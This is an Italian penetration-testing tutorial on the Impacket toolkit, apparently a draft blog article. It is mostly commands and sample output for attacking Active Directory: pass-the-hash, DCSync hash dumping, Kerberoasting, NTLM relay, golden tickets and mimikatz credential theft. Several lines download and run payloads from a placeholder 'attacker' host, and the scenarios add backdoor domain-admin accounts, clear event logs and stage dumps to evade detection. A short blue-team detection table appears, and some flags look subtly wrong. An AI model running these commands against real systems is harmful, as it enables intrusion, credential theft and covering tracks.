---
title: 'Impacket: Toolkit Python per Attacchi SMB, Kerberos e Active Directory'
slug: impacket
description: 'Impacket è una suite Python per interagire con protocolli di rete (SMB, LDAP, Kerberos, RPC) e condurre attacchi AD come DCSync e Pass-the-Hash.'
image: /Gemini_Generated_Image_ggu0akggu0akggu0.webp
draft: true
date: 2026-02-15T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - ad
  - smb
---

Impacket è una suite Python sviluppata da Fortra (ex Core Security) che implementa manipulation di protocolli di rete Microsoft (SMB, MSRPC, LDAP, Kerberos) per operazioni offensive su ambienti Windows e Active Directory. La libreria fornisce accesso low-level ai protocolli permettendo exploitation avanzata come DCSync, pass-the-hash, Kerberos delegation attacks e SMB relay senza necessità di binari Windows nativi.

La forza di Impacket risiede nella capacità di eseguire attacchi complessi da sistema Linux/macOS contro infrastrutture Windows, eliminando dipendenze da tooling Windows-based. Gli script della suite coprono l'intero ciclo di un engagement: da reconnaissance (GetADUsers.py) a lateral movement (psexec.py, wmiexec.py) fino a domain takeover (secretsdump.py per DCSync). Impacket si integra perfettamente con output di [Responder](https://hackita.it/articoli/responder) per relay attacks e [Hashcat](https://hackita.it/articoli/hashcat) per hash cracking.

In questa guida impari a usare gli script Impacket fondamentali per penetration testing Active Directory, tecniche di pass-the-hash per lateral movement stealth, DCSync per extraction completa domain database, e differenze tra psexec.py/wmiexec.py/smbexec.py per scegliere il metodo ottimale in base a detection posture target.

## Setup e Installazione

**Repository ufficiale:** [https://github.com/fortra/impacket](https://github.com/fortra/impacket)\
**Versione corrente:** v0.12.0 (gennaio 2025)

### Installazione via pip

```bash
# Metodo consigliato
pip3 install impacket

# Verifica installazione
psexec.py -h
secretsdump.py -h
```

### Installazione da Source

```bash
# Clone repository
git clone https://github.com/fortra/impacket.git
cd impacket

# Install in developer mode
pip3 install .

# Oppure senza installazione
python3 setup.py install
```

### Kali Linux

Impacket è preinstallato su Kali:

```bash
# Verifica presenza
which psexec.py

# Update all'ultima versione
sudo pip3 install --upgrade impacket

# Location scripts
ls /usr/share/doc/python3-impacket/examples/
```

### Dipendenze Python

```bash
# Install dependencies manualmente se necessario
pip3 install pyasn1 pycryptodomex pyOpenSSL ldap3 flask

# Kerberos support (opzionale)
sudo apt install krb5-user
```

### Verifica Funzionamento

```bash
# Test script disponibili
impacket-psexec -h
impacket-secretsdump -h
impacket-GetNPUsers -h

# Verifica versione
python3 -c "import impacket; print(impacket.__version__)"
```

**Output:** `0.12.0`

## Uso Base

### Architettura Script Impacket

Impacket fornisce \~60 script Python per operazioni specifiche. I più rilevanti per pentest:

## Remote Execution

* [`psexec`](https://hackita.it/articoli/psexec)
  Esegue comandi remoti creando un servizio temporaneo via SMB. Metodo diretto e molto affidabile per ottenere shell SYSTEM.
* [`smbexec`](https://hackita.it/articoli/smbexec)
  Variante più stealth rispetto a psexec: usa share SMB e file temporanei senza installare un servizio persistente.
* [`wmiexec`](https://hackita.it/articoli/wmiexec)
  Esecuzione remota tramite WMI. Spesso più silenzioso lato AV/EDR rispetto a psexec.
* [`dcomexec`](https://hackita.it/articoli/dcomexec)
  Abusa di DCOM per command execution remota quando WMI è filtrato.
* [`atexec`](https://hackita.it/articoli/atexec)
  Sfrutta Task Scheduler per creare task remoti che eseguono comandi privilegiati.

***

## Credential Access

* [`secretsdump`](https://hackita.it/articoli/secretsdump)
  Dump di hash NTLM da SAM/LSA oppure attacco DCSync contro il Domain Controller.
* [`GetNPUsers`](https://hackita.it/articoli/getnpusers)
  AS-REP Roasting: estrae hash di account con pre-authentication disabilitata.
* [`GetUserSPNs`](https://hackita.it/articoli/getuserspns)
  Kerberoasting: richiede ticket di servizio (TGS) per crack offline.
* [`getTGT`](https://hackita.it/articoli/gettgt)
  Richiede un Ticket Granting Ticket valido usando credenziali o hash.
* [`getST`](https://hackita.it/articoli/getst)
  Richiede un Service Ticket specifico per un servizio nel dominio.

***

## Enumeration

* [`GetADUsers`](https://hackita.it/articoli/getadusers)
  Enumerazione utenti Active Directory via LDAP.
* [`lookupsid`](https://hackita.it/articoli/lookupsid)
  Brute-force dei SID per mappare utenti e gruppi di dominio.
* [`rpcdump`](https://hackita.it/articoli/rpcdump)
  Elenca endpoint RPC esposti su un host Windows.
* [`samrdump`](https://hackita.it/articoli/samrdump)
  Dump di informazioni sugli account tramite protocollo SAMR.

***

## SMB Operations

* [`smbclient`](https://hackita.it/articoli/smbclient)
  Client SMB interattivo per navigare share e trasferire file.
* [`smbserver`](https://hackita.it/articoli/smbserver)
  Avvia un server SMB locale per ricevere file o montare share durante un attacco.
* [`ntlmrelayx`](https://hackita.it/articoli/ntlmrelayx)
  Framework per NTLM relay: intercetta autenticazioni NTLM e le rilancia verso altri servizi per escalation o lateral movement.

### psexec.py: Remote Execution Base

```bash
# Password authentication
psexec.py DOMAIN/user:password@192.168.1.100

# Pass-the-hash
psexec.py -hashes :NTLM_HASH DOMAIN/user@target

# Local authentication
psexec.py ./administrator:password@192.168.1.100

# With command
psexec.py DOMAIN/user:pass@target 'whoami'
```

**Parametri comuni:**

| Flag              | Funzione                     |
| ----------------- | ---------------------------- |
| `-hashes LM:NTLM` | Pass-the-hash authentication |
| `-k`              | Use Kerberos authentication  |
| `-dc-ip IP`       | Domain Controller IP         |
| `-target-ip IP`   | Force specific IP            |
| `-port PORT`      | Custom SMB port              |
| `-codec CODEC`    | Output encoding              |

**Output esempio:**

```bash
psexec.py CORP/admin:P@ssw0rd@192.168.1.100

Impacket v0.12.0 - Copyright Fortra, LLC

[*] Requesting shares on 192.168.1.100.....
[*] Found writable share ADMIN$
[*] Uploading file QhTvXpKR.exe
[*] Opening SVCManager on 192.168.1.100.....
[*] Creating service mLOG on 192.168.1.100.....
[*] Starting service mLOG.....
[!] Press help for extra shell commands

Microsoft Windows [Version 10.0.19045]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### secretsdump.py: Credential Extraction

```bash
# DCSync (richiede DA o DCSync rights)
secretsdump.py DOMAIN/admin:password@dc01.corp.local

# Pass-the-hash
secretsdump.py -hashes :NTLM DOMAIN/admin@dc01

# Local SAM dump (richiede local admin)
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

# NTDS.dit extraction
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

**Output DCSync:**

```
Impacket v0.12.0

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b7d5c6f2e8a1c5e4d3b2a9f8e7d6c5b4:::
```

### GetUserSPNs.py: Kerberoasting

```bash
# Enumerate Kerberoastable accounts
GetUserSPNs.py CORP/user:password -dc-ip 192.168.1.10

# Request tickets e salva
GetUserSPNs.py CORP/user:password -dc-ip 192.168.1.10 -request -outputfile tickets.txt

# Pass-the-hash
GetUserSPNs.py -hashes :NTLM CORP/user -dc-ip 192.168.1.10 -request
```

**Output:**

```
ServicePrincipalName              Name        MemberOf
--------------------------------  ----------  ------------------
MSSQLSvc/sql01.corp.local:1433    svc_sql     CN=Domain Users
HTTP/sharepoint.corp.local        svc_web     CN=Domain Users

[*] Getting TGS for svc_sql
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$8f7e...

[*] Getting TGS for svc_web
$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/sharepoint.corp.local*$9a2b...
```

## Tecniche Operative

### Pass-the-Hash Workflow

Il meccanismo PTH di Impacket bypassa necessità password plaintext usando solo hash NTLM.

**Extraction hash:**

```bash
# Da sistema compromesso (Windows)
.\mimikatz.exe "sekurlsa::logonpasswords" exit

# Output:
# Username: admin
# NTLM: a4f49c406510bdcab6824ee7c30fd852
```

**Utilizzo hash:**

```bash
# psexec PTH
psexec.py -hashes :a4f49c406510bdcab6824ee7c30fd852 CORP/admin@192.168.1.101

# wmiexec PTH (stealth)
wmiexec.py -hashes :a4f49c406510bdcab6824ee7c30fd852 CORP/admin@target

# secretsdump PTH
secretsdump.py -hashes :a4f49c406510bdcab6824ee7c30fd852 CORP/admin@dc01
```

**Formato hash:** LM hash (obsoleto, usa `aad3b435b51404eeaad3b435b51404ee`) + NTLM hash.

```bash
# Formato completo
-hashes aad3b435b51404eeaad3b435b51404ee:a4f49c406510bdcab6824ee7c30fd852

# Solo NTLM (consigliato)
-hashes :a4f49c406510bdcab6824ee7c30fd852
```

### wmiexec.py per Stealth

wmiexec.py non droppa binari su target, usando solo WMI per command execution.

```bash
# Basic usage
wmiexec.py CORP/admin:password@192.168.1.100

# Con PTH
wmiexec.py -hashes :hash CORP/admin@target

# Custom shell (cmd o powershell)
wmiexec.py CORP/admin:pass@target -shell-type powershell
```

**Vantaggio:** No service creation (no Event 7045), no binary in C:\Windows.

**Svantaggio:** Output via file temporaneo in C:\Windows\Temp (leave artifacts).

**Comparison timing:**

| Method      | Connection | First Command | Detection         |
| ----------- | ---------- | ------------- | ----------------- |
| psexec.py   | 2-3 sec    | 1 sec         | Alta (Event 7045) |
| wmiexec.py  | 1-2 sec    | 2-3 sec       | Media             |
| smbexec.py  | 2 sec      | 1-2 sec       | Media-Alta        |
| dcomexec.py | 1-2 sec    | 2-3 sec       | Bassa             |

### DCSync Attack

DCSync simula Domain Controller replication per estrarre password hashes senza accesso fisico DC.

**Requisiti:**

* Credenziali con uno di:
  * Domain Admin
  * Enterprise Admin
  * Replicating Directory Changes + Replicating Directory Changes All (permissions custom)

```bash
# DCSync completo (tutti gli utenti)
secretsdump.py CORP/Administrator:password@dc01.corp.local

# DCSync specifico utente
secretsdump.py CORP/admin:pass@dc01 -just-dc-user krbtgt

# Con PTH
secretsdump.py -hashes :hash CORP/admin@dc01 -just-dc-ntlm

# Output formato
secretsdump.py CORP/admin:pass@dc01 -outputfile domain_hashes
```

**Output files:**

```
domain_hashes.ntds - NTLM hashes
domain_hashes.ntds.cleartext - Plaintext passwords (se presenti)
domain_hashes.ntds.kerberos - Kerberos keys
```

**Performance:** \~500-2000 accounts/secondo (dipende da network latency).

### Kerberoasting Chain

```bash
# Step 1: Enumerate SPNs
GetUserSPNs.py CORP/user:password -dc-ip 192.168.1.10

# Step 2: Request tickets
GetUserSPNs.py CORP/user:password -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt

# Step 3: Crack con Hashcat
hashcat -m 13100 kerberoast.txt rockyou.txt --force

# Step 4: Use cracked password
psexec.py CORP/svc_sql:CrackedPassword123!@sql01.corp.local
```

**Timeline realistico:** 5-10 minuti enumeration + cracking (dipende da password complexity).

## Tecniche Avanzate

### AS-REP Roasting

AS-REP roasting sfrutta account con "Do not require Kerberos preauthentication" enabled.

```bash
# Enumerate vulnerable users
GetNPUsers.py CORP/ -dc-ip 192.168.1.10 -usersfile users.txt -format hashcat

# Con credenziali valide
GetNPUsers.py CORP/user:password -dc-ip 192.168.1.10 -request

# Output AS-REP hash
$krb5asrep$23$user@CORP.LOCAL:a8f4e9c2b...
```

**Crack hash:**

```bash
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

**Differenza vs Kerberoasting:**

* **AS-REP roasting:** Non richiede credenziali valide (userlist sufficient)
* **Kerberoasting:** Richiede credenziali domain user

### [NTLM](https://hackita.it/articoli/ntlm) Relay con ntlmrelayx.py

```bash
# Setup relay to target
ntlmrelayx.py -t smb://192.168.1.100 -smb2support

# Con specific command
ntlmrelayx.py -t 192.168.1.100 -c "powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"

# SOCKS proxy per interactive access
ntlmrelayx.py -tf targets.txt -socks -smb2support

# Relay to LDAP (per privilege escalation)
ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user lowpriv
```

**Integration con Responder:**

```bash
# Terminal 1: Responder poison
sudo responder -I eth0 -v

# Terminal 2: ntlmrelayx relay
ntlmrelayx.py -tf targets.txt -smb2support

# Quando victim authenticate → relay automatico
```

### Kerberos Delegation Attacks

```bash
# Unconstrained delegation enumeration
findDelegation.py CORP/user:password -dc-ip 192.168.1.10

# Constrained delegation abuse
getST.py -spn cifs/target.corp.local -impersonate Administrator CORP/delegated_user:password

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass CORP/Administrator@target.corp.local
```

### NTDS.dit Offline Extraction

```bash
# Step 1: Copy NTDS.dit e SYSTEM hive (da DC)
# Via volume shadow copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive

# Step 2: Transfer a attacker machine
# [transfer via SMB/HTTP]

# Step 3: Extract hashes offline
secretsdump.py -ntds ntds.dit -system system.hive LOCAL -outputfile domain_full_dump
```

**Vantaggio:** Extraction offline, no network traffic durante dump, no detection real-time.

## Scenari Pratici

### Scenario 1: Lateral Movement Post-Hash Extraction

**Contesto:** Hai dumpato NTLM hash da workstation compromessa, vuoi propagarti lateralmente.

**Timeline:** 2-5 minuti per target

**Step 1 - Hash extraction:**

```bash
# Su workstation compromessa (Windows)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > creds.txt
```

**Output:**

```
Username: backup_admin
NTLM: b4e7c8d9a1f2e3b5c6a7d8e9f0a1b2c3
```

**Step 2 - Validate hash:**

```bash
# Test con crackmapexec
crackmapexec smb 192.168.10.0/24 -u backup_admin -H b4e7c8d9a1f2e3b5c6a7d8e9f0a1b2c3 --continue-on-success
```

**Output:**

```
SMB  192.168.10.20  445  MGMT-01  [+] CORP\backup_admin:b4e7c8... (Pwn3d!)
SMB  192.168.10.21  445  MGMT-02  [+] CORP\backup_admin:b4e7c8... (Pwn3d!)
SMB  192.168.10.22  445  FILE-01  [+] CORP\backup_admin:b4e7c8... (Pwn3d!)
```

**Step 3 - Lateral movement:**

```bash
# psexec PTH su primo target
psexec.py -hashes :b4e7c8d9a1f2e3b5c6a7d8e9f0a1b2c3 CORP/backup_admin@192.168.10.20
```

**Output:**

```
Impacket v0.12.0

[*] Requesting shares on 192.168.10.20.....
[*] Found writable share ADMIN$
[*] Uploading file MnPqRsTu.exe
[*] Opening SVCManager on 192.168.10.20.....
[*] Creating service KLmN on 192.168.10.20.....
[*] Starting service KLmN.....

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
MGMT-01
```

**Step 4 - Credential harvest su nuovo target:**

```bash
# Upload mimikatz
C:\> powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://attacker/mimikatz.exe','C:\Windows\Temp\m.exe')"

# Dump
C:\Windows\Temp> m.exe "sekurlsa::logonpasswords" exit > C:\Windows\Temp\dump.txt

# Download
C:\> type C:\Windows\Temp\dump.txt
```

**Nuovi hash trovati → ripeti Step 2-4 per propagazione.**

**Cosa fare se fallisce:**

**"STATUS\_LOGON\_FAILURE":**

* **Causa:** Hash invalido o account non ha admin rights su target
* **Fix:** Re-dump hash, verifica group membership

```bash
# Check se user è local admin
crackmapexec smb target -u user -H hash --local-auth
```

**"Connection refused" o timeout:**

* **Causa:** Firewall blocca SMB (445) o target offline
* **Fix:** Port scan, prova WinRM (5985)

```bash
nmap -p445,5985 target
evil-winrm -i target -u user -H hash
```

**psexec.py fallisce ma credenziali valide:**

* **Causa:** EDR blocca service creation o PSEXESVC
* **Fix:** Usa wmiexec.py (stealth)

```bash
wmiexec.py -hashes :hash CORP/user@target
```

### Scenario 2: DCSync Domain Takeover

**Contesto:** Compromesso account con DCSync rights, vuoi full domain database.

**Timeline:** 5-15 minuti (dipende da domain size)

**Step 1 - Verify privileges:**

```bash
# Check se account ha DCSync rights
# [requires BloodHound analysis o manual LDAP query]

# Oppure test diretto
secretsdump.py CORP/compromised_user:password@dc01.corp.local -just-dc-user Administrator
```

**Se succede → hai DCSync rights.**

**Step 2 - Full DCSync:**

```bash
# Dump completo domain
secretsdump.py CORP/compromised_user:password@dc01.corp.local -outputfile domain_dump
```

**Output:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b7d5c6f2e8a1c5e4d3b2a9f8e7d6c5b4:::
svc_sql:1104:aad3b435b51404eeaad3b435b51404ee:a4f49c406510bdcab6824ee7c30fd852:::
[... 2,500 accounts ...]

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:8f7e6d5c4b3a2918...
```

**Timeline:** \~3-5 minuti per 1,000 accounts, \~10-15 minuti per 10,000 accounts.

**Step 3 - Parse critical accounts:**

```bash
# Extract solo Domain Admins
grep -i "Domain Admins" domain_dump.ntds

# Extract krbtgt per golden ticket
grep "krbtgt" domain_dump.ntds
```

**Step 4 - Golden Ticket creation:**

```bash
# Con Impacket ticketer
ticketer.py -nthash b7d5c6f2e8a1c5e4d3b2a9f8e7d6c5b4 -domain-sid S-1-5-21-123456789-987654321-111111111 -domain corp.local Administrator

# Output: Administrator.ccache

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass CORP/Administrator@dc01.corp.local
```

**Step 5 - Persistence:**

```bash
# Create backdoor admin
C:\> net user hacker P@ssw0rd123! /add /domain
C:\> net group "Domain Admins" hacker /add /domain
```

**Cosa fare se fallisce:**

**"DRSU Access Denied":**

* **Causa:** Account non ha DCSync rights (Replicating Directory Changes permissions)
* **Fix:** Escalate privileges o trova account con rights tramite BloodHound

**DCSync solo parziale (alcuni account mancano):**

* **Causa:** Read-only Domain Controller (RODC) come target
* **Fix:** Target writable DC

```bash
# Identifica writable DC
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
```

**Network timeout durante dump large domain:**

* **Causa:** DC slow response o network latency alta
* **Fix:** Dump incrementale per OU

```bash
# Dump solo OU specifica
secretsdump.py CORP/user:pass@dc01 -just-dc -base-dn "OU=Users,DC=corp,DC=local"
```

### Scenario 3: Kerberoasting to SQL Server Compromise

**Contesto:** Domain user standard, vuoi escalate via Kerberoasting.

**Timeline:** 20-40 minuti (include cracking)

**Step 1 - Enumerate SPNs:**

```bash
GetUserSPNs.py CORP/lowpriv_user:UserPass123!@ -dc-ip 192.168.1.10
```

**Output:**

```
ServicePrincipalName              Name        MemberOf
--------------------------------  ----------  ------------------
MSSQLSvc/sql01.corp.local:1433    svc_sql     CN=SQL Admins
HTTP/web.corp.local               svc_web     CN=Web Admins
```

**Step 2 - Request tickets:**

```bash
GetUserSPNs.py CORP/lowpriv_user:UserPass123!@ -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt
```

**Output file kerberoast.txt:**

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$8f7e6d5c...
$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web.corp.local*$a4f49c4065...
```

**Step 3 - Crack offline:**

```bash
# Hashcat con rockyou
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force

# Output dopo 15 minuti:
# $krb5tgs$23$*svc_sql$CORP...:SQLService2023!
```

**Step 4 - SQL Server access:**

```bash
# mssqlclient.py con credenziali craccate
mssqlclient.py CORP/svc_sql:SQLService2023!@@sql01.corp.local
```

**Output:**

```
Impacket v0.12.0

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.

SQL> SELECT SYSTEM_USER;
CORP\svc_sql

SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
nt service\mssql$sqlexpress
```

**Step 5 - Privilege escalation via SQL:**

```bash
# Check se svc_sql ha impersonation rights
SQL> SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

# Impersonate sa
SQL> EXECUTE AS LOGIN = 'sa';
SQL> EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker/shell.ps1")';
```

**Reverse shell ricevuta → escalation completa SQL server.**

**Cosa fare se fallisce:**

**Nessun SPN trovato:**

* **Causa:** Nessun service account con SPN configurato
* **Fix:** Enumera manualmente LDAP

```bash
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\user" -w password -b "DC=corp,DC=local" "servicePrincipalName=*" servicePrincipalName
```

**Hash cracking fallisce:**

* **Causa:** Password forte non in wordlist
* **Fix:** Custom rules o brute-force mirato

```bash
# Rules-based attack
hashcat -m 13100 kerberoast.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Password spray con variazioni
hashcat -m 13100 kerberoast.txt --stdout | hashcat -m 13100 kerberoast.txt
```

**mssqlclient.py "Login failed":**

* **Causa:** Account valid ma senza SQL login
* **Fix:** Verifica SQL permissions o usa Windows authentication

```bash
# Force Windows auth
mssqlclient.py -windows-auth CORP/svc_sql:pass@sql01
```

## Toolchain Integration

### Flusso Attack Chain Completo

```
Responder (capture) → Impacket ntlmrelayx (relay) → secretsdump (DCSync) → psexec (lateral)
```

**Esempio pratico:**

```bash
# Step 1: Responder poisoning
sudo responder -I eth0 -wv

# Step 2: NTLM relay setup
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(...)"

# Step 3: Quando relay succede, use credentials
psexec.py CORP/relayed_user@target

# Step 4: Escalate e DCSync
secretsdump.py CORP/admin:pass@dc01 -outputfile full_dump

# Step 5: Mass lateral movement
while read ip; do
    wmiexec.py -hashes :hash CORP/admin@$ip "whoami"
done < targets.txt
```

### Impacket vs Native Windows Tools

| Capability           | Impacket          | Native Windows           | Vantaggio         |
| -------------------- | ----------------- | ------------------------ | ----------------- |
| **Platform**         | Linux/Mac/Windows | Windows only             | Cross-platform    |
| **Pass-the-Hash**    | Native support    | Requires mimikatz        | Built-in          |
| **DCSync**           | secretsdump.py    | mimikatz lsadump::dcsync | No binary drop    |
| **Kerberoasting**    | GetUserSPNs.py    | Rubeus.exe               | Python-based      |
| **Lateral movement** | psexec/wmiexec    | PsExec.exe               | Multiple methods  |
| **Detection**        | Medio             | Varies                   | Depends on method |
| **Logging**          | Controllabile     | Full telemetry           | Less forensics    |

**Quando usare Impacket:**

* Attacco da Linux (common in pentest)
* Necessità pass-the-hash senza Mimikatz
* Cross-platform operations
* Scripting automation (Python)

**Quando usare Windows native:**

* Già su sistema Windows compromesso
* Specific capabilities (es. token manipulation)
* Evasion tailored per environment

### Integration con CrackMapExec

CrackMapExec usa Impacket internamente ma fornisce interface più user-friendly.

```bash
# CME per validation massiva
crackmapexec smb 192.168.1.0/24 -u admin -H hash --continue-on-success

# CME trova 10 target vulnerabili

# Impacket per exploitation singola targeted
psexec.py -hashes :hash CORP/admin@192.168.1.50

# Impacket per DCSync
secretsdump.py -hashes :hash CORP/admin@192.168.1.10
```

**Workflow ottimale:** CME per reconnaissance → Impacket per exploitation.

### Integration con Mimikatz Output

```bash
# Mimikatz dump su Windows
.\mimikatz.exe "sekurlsa::logonpasswords" exit > creds.txt

# Parse NTLM hash
grep "NTLM" creds.txt | awk '{print $3}'

# Output: a4f49c406510bdcab6824ee7c30fd852

# Impacket PTH immediate
psexec.py -hashes :a4f49c406510bdcab6824ee7c30fd852 CORP/admin@next_target
```

## Attack Chain Completa

### Network Reconnaissance → Domain Admin (4-6 ore)

**Fase 1: Network Reconnaissance (T+0)**

```bash
# Nmap scan
nmap -p445,88,389 192.168.10.0/24

# Identified: DC at 192.168.10.10
```

**Fase 2: SMB Relay Attack (T+20min)**

```bash
# Terminal 1: Responder
sudo responder -I eth0 -v

# Terminal 2: ntlmrelayx
ntlmrelayx.py -t ldap://192.168.10.10 --escalate-user lowpriv

# Victim authenticate → privilege escalated
```

**Fase 3: AS-REP Roasting (T+45min)**

```bash
# Enumerate vulnerable accounts
GetNPUsers.py CORP/ -dc-ip 192.168.10.10 -usersfile userlist.txt -format hashcat

# Output: 3 AS-REP hashes

# Crack
hashcat -m 18200 asrep.txt rockyou.txt

# Cracked: user1:Welcome2024!
```

**Fase 4: Kerberoasting (T+1h 15min)**

```bash
# Authenticated enumeration
GetUserSPNs.py CORP/user1:Welcome2024!@ -dc-ip 192.168.10.10 -request -outputfile tgs.txt

# Crack service accounts
hashcat -m 13100 tgs.txt rockyou.txt

# Cracked: svc_backup:BackupPass123!
```

**Fase 5: Privilege Verification (T+1h 40min)**

```bash
# Check svc_backup privileges (BloodHound analysis showed DCSync rights)

# Test DCSync
secretsdump.py CORP/svc_backup:BackupPass123!@@192.168.10.10 -just-dc-user Administrator
```

**Success → svc\_backup ha DCSync rights!**

**Fase 6: Full Domain Dump (T+2h)**

```bash
# Complete DCSync
secretsdump.py CORP/svc_backup:BackupPass123!@@192.168.10.10 -outputfile corp_full_dump

# 3,200 accounts dumped in 8 minutes
```

**Fase 7: Golden Ticket (T+2h 15min)**

```bash
# Extract krbtgt hash
grep "krbtgt" corp_full_dump.ntds
# krbtgt:502:...:c8f4e9d2a1b5e3f7c6d8a9e0f1b2c3d4:::

# Create golden ticket
ticketer.py -nthash c8f4e9d2a1b5e3f7c6d8a9e0f1b2c3d4 -domain-sid S-1-5-21... -domain corp.local Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass CORP/Administrator@192.168.10.10
```

**Fase 8: Persistence (T+2h 30min)**

```bash
# On DC
C:\> net user backdoor P@ssw0rd123! /add /domain
C:\> net group "Domain Admins" backdoor /add /domain
C:\> net group "Enterprise Admins" backdoor /add /domain

# Verify
C:\> net user backdoor /domain
```

**Risultato:** Domain takeover completo via Impacket attack chain.

## Detection & Evasion

### Blue Team Detection Vectors

**Event ID monitoring:**

| Event ID | Component | Indicator                                      |
| -------- | --------- | ---------------------------------------------- |
| **4624** | Security  | Logon Type 3 (Network) suspicious source       |
| **4672** | Security  | Admin privileges assigned unusual account      |
| **4662** | Security  | DRSUAPI DCSync operation                       |
| **5145** | Security  | ADMIN$/IPC$ share access                       |
| **7045** | System    | Service installed (psexec PSEXESVC)            |
| **4688** | Security  | Process creation: wmiprvse.exe, cmd.exe chains |
| **4769** | Security  | Kerberos TGS request (Kerberoasting detection) |
| **4768** | Security  | Kerberos TGT request (AS-REP roasting)         |

**Network detection:**

```
DCSync traffic pattern:
- DRSUAPI RPC calls to port 135 + dynamic high port
- Large LDAP response packets (>100 KB)
- Sequential GUID-based queries

Kerberoasting pattern:
- Rapid TGS-REQ for multiple SPNs
- RC4 encryption requested (vs AES)
```

**Behavioral analytics:**

* Service accounts lateral movement (unusual)
* Off-hours DCSync operations
* Geographic anomalies (source IP)

### Tecniche Evasion

**1. Kerberos invece NTLM**

```bash
# NTLM (più monitored)
psexec.py -hashes :hash CORP/user@target

# Kerberos (meno suspicious)
getTGT.py CORP/user:password
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass CORP/user@target
```

Kerberos authentication genera meno alert SOC-centric on NTLM monitoring.

**2. wmiexec invece psexec**

```bash
# psexec: alta detection (Event 7045)
psexec.py CORP/user:pass@target

# wmiexec: media detection (no service)
wmiexec.py CORP/user:pass@target
```

**3. Staged DCSync**

```bash
# Full dump (suspicious: 10 GB traffic)
secretsdump.py CORP/admin:pass@dc01

# Staged dump (stealth: multiple small sessions)
secretsdump.py CORP/admin:pass@dc01 -just-dc-user Administrator
# Wait 1 hour
secretsdump.py CORP/admin:pass@dc01 -just-dc-user krbtgt
# Wait 2 hours
secretsdump.py CORP/admin:pass@dc01 -just-dc-ntlm | head -100
```

Distribuzione nel tempo riduce spike detection.

### Cleanup Post-Exploitation

```bash
# psexec cleanup (automatico ma verifica)
# Service PSEXESVC removed automaticamente
# Binary in C:\Windows\System32 deleted

# wmiexec cleanup
# Elimina output files in C:\Windows\Temp
C:\> del /f /q C:\Windows\Temp\__output C:\Windows\Temp\__error

# Clear event logs (richiede elevated privileges)
C:\> wevtutil cl Security
C:\> wevtutil cl System

# Prefetch cleanup
C:\> del /f /q C:\Windows\Prefetch\*.pf
```

**Scripted cleanup:**

```python
# cleanup.py - esegui via wmiexec
import os
os.system('del /f /q C:\\Windows\\Temp\\__*')
os.system('del /f /q C:\\Windows\\Prefetch\\PSEXESVC*.pf')
os.system('wevtutil cl Security 2>nul')
```

## Performance & Scaling

### Single Target Performance

**psexec.py timing:**

```bash
# Cold connection (first time)
time psexec.py CORP/admin:pass@target 'whoami'

# Real: 0m3.2s
# User: 0m0.8s
# Sys: 0m0.1s
```

**Breakdown:**

* SMB connection: 0.5s
* Service creation: 1.2s
* Command execution: 0.8s
* Cleanup: 0.7s

**wmiexec.py timing:**

```bash
time wmiexec.py CORP/admin:pass@target 'whoami'

# Real: 0m2.8s
```

Slightly faster (no service creation overhead).

### Mass Lateral Movement

**100 target scenario:**

| Method     | Sequential   | Parallel (10 threads) | Parallel (20 threads) |
| ---------- | ------------ | --------------------- | --------------------- |
| psexec.py  | \~5 minuti   | \~35 secondi          | \~20 secondi          |
| wmiexec.py | \~4.5 minuti | \~30 secondi          | \~18 secondi          |

**Parallel execution script:**

```bash
#!/bin/bash
# parallel_psexec.sh

cat targets.txt | parallel -j 20 'psexec.py -hashes :hash CORP/admin@{} "hostname" 2>&1 | tee {}.txt'
```

### DCSync Performance

**Domain size benchmarks:**

| Accounts | Time   | Data Size | Network Usage |
| -------- | ------ | --------- | ------------- |
